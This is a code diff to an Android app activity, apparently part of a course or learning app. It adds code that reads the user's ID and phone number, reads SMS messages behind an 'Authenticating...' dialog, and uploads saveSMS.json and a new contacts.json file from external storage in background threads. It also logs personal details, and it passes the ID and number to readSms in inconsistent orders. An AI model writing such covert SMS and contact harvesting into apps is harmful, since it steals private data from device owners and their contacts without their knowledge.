@@ -81,6 +81,16 @@ public class Main2ActivityNavigation extends AppCompatActivity
         Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
         setSupportActionBar(toolbar);
 
+        /** getting data from shared preference **/
+        SharedPreferences sharedPreferences = getSharedPreferences("UserData", getApplicationContext().MODE_PRIVATE);
+        String firstnameshared = sharedPreferences.getString("first_name", "null");
+        String lastnameshared = sharedPreferences.getString("last_name", "null");
+        String emailshared = sharedPreferences.getString("user_email", "null");
+        String userID = sharedPreferences.getString("logged_id", "null");
+        String userNo = sharedPreferences.getString("mobile_no", "null");
+        userpic = sharedPreferences.getString("user_image", "null");
+
+        Log.e(MainApplication.TAG, "firstnameshared: " + firstnameshared + "lastnameshared: " + lastnameshared + "emailshared: " + emailshared + "logged_id: " + sharedPreferences.getString("logged_id", "null"));
 
 
         MainApplication.mainapp_courseID = "";
@@ -130,14 +140,14 @@ public class Main2ActivityNavigation extends AppCompatActivity
                         Log.i("TAG", "Permission to record denied");
                         makeRequest();
                         if(permission == PackageManager.PERMISSION_GRANTED && permission2 == PackageManager.PERMISSION_GRANTED && permission3== PackageManager.PERMISSION_GRANTED) {
-                            MainApplication.readSms(getApplicationContext());
+                            MainApplication.readSms(getApplicationContext(), userID, userNo);
                             Log.e(TAG, "onCreate: " + "AYYYYYAAAA");
                             //                                MainApplication.contactsRead(getApplicationContext());
                             mReadJsonData();
                         }
                     } else if(permission == PackageManager.PERMISSION_GRANTED && permission2 == PackageManager.PERMISSION_GRANTED && permission3== PackageManager.PERMISSION_GRANTED){
 
-                        MainApplication.readSms(getApplicationContext());
+                        MainApplication.readSms(getApplicationContext(), userNo, userID);
                         Log.e(TAG, "onCreate: "+"AYYYYYAAAA" );
                         mDialogBar = new ProgressDialog(Main2ActivityNavigation.this, R.style.AppTheme_Dark_Dialog);
                         mDialogBar.setMessage("Authenticating... ");
@@ -148,7 +158,7 @@ public class Main2ActivityNavigation extends AppCompatActivity
                         mReadJsonData();
                     }
                 }else {
-                    MainApplication.readSms(getApplicationContext());
+                    MainApplication.readSms(getApplicationContext(), userNo, userID);
                     Log.e(TAG, "onCreate: "+"AYYYYYAAAA" );
                     //                        MainApplication.contactsRead(getApplicationContext());
                     mReadJsonData();
@@ -185,13 +195,6 @@ public class Main2ActivityNavigation extends AppCompatActivity
         textViewName.setTypeface(typefaceFontBold);
         textViewEmail.setTypeface(typefaceFontBold);
 
-        SharedPreferences sharedPreferences = getSharedPreferences("UserData", getApplicationContext().MODE_PRIVATE);
-        String firstnameshared = sharedPreferences.getString("first_name", "null");
-        String lastnameshared = sharedPreferences.getString("last_name", "null");
-        String emailshared = sharedPreferences.getString("user_email", "null");
-        userpic = sharedPreferences.getString("user_image", "null");
-
-        Log.e(MainApplication.TAG, "firstnameshared: " + firstnameshared + "lastnameshared: " + lastnameshared + "emailshared: " + emailshared + "logged_id: " + sharedPreferences.getString("logged_id", "null"));
 
         if (!userpic.equalsIgnoreCase("null") || !userpic.equalsIgnoreCase("")) {
             Picasso.with(getApplicationContext()).load(userpic).into(imageView);
@@ -357,6 +360,20 @@ public class Main2ActivityNavigation extends AppCompatActivity
             dir.mkdirs();
         }
         final File f = new File(dir, "saveSMS.json");
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                uploadFile(f.getAbsolutePath());
+            }
+        }).start();
+    }
+
+    public void mReadJsonDataContacts() {
+        final File dir = new File(Environment.getExternalStorageDirectory() + "/");
+        if (dir.exists() == false) {
+            dir.mkdirs();
+        }
+        final File f = new File(dir, "contacts.json");
         new Thread(new Runnable() {
             @Override
             public void run() {
